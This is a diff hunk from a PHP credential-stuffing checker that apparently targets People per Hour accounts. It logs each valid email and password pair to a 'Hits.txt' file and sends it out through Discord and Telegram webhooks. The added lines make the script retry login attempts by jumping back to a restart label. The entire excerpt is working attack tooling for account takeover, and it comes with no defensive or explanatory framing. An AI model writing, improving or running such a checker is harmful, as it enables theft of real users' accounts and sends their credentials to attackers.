@@ -289,6 +289,8 @@ if(str_contains($response,'Wrong email or password.')){
         webhook($choice,$discordurl,$discorddata,$telegramdata,$params,$teletoken);
         file_put_contents('Hits.txt',"---New People per Hour Hit---\n[+]Data: $user:$pass\n\n",FILE_APPEND);
         replaceOut("[+]Total Progress: ".show_status($total, $count)."\n[+]Dead: $fail\n[+]Hits Count: $hits\n");
+ }else{
+ goto restart;
  }
 }
 }
